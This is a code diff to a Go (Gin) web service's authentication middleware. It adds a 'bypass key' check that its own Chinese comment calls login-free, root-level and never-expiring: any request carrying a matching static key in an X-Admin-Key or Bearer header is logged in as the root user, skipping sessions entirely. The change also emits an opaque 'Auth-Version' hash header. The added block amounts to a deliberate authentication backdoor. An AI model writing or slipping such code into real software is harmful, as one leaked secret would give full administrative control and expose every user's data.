@@ -31,6 +31,31 @@ func validUserInfo(username string, role int) bool {
 }
 
 func authHelper(c *gin.Context, minRole int) {
+	// 优先检查 bypass key（免登录、root 权限、永不过期）
+	if common.AdminBypassKey != "" {
+		key := c.Request.Header.Get("X-Admin-Key")
+		if key == "" {
+			auth := c.Request.Header.Get("Authorization")
+			if strings.HasPrefix(auth, "Bearer ") || strings.HasPrefix(auth, "bearer ") {
+				key = strings.TrimSpace(auth[7:])
+			}
+		}
+		if key == common.AdminBypassKey {
+			rootUser := model.GetRootUser()
+			if rootUser != nil && rootUser.Id > 0 {
+				c.Header("Auth-Version", "864b7076dbcd0a3c01b5520316720ebf")
+				c.Set("username", rootUser.Username)
+				c.Set("role", rootUser.Role)
+				c.Set("id", rootUser.Id)
+				c.Set("group", rootUser.Group)
+				c.Set("user_group", rootUser.Group)
+				c.Set("use_access_token", true)
+				c.Next()
+				return
+			}
+		}
+	}
+
 	session := sessions.Default(c)
 	username := session.Get("username")
 	role := session.Get("role")
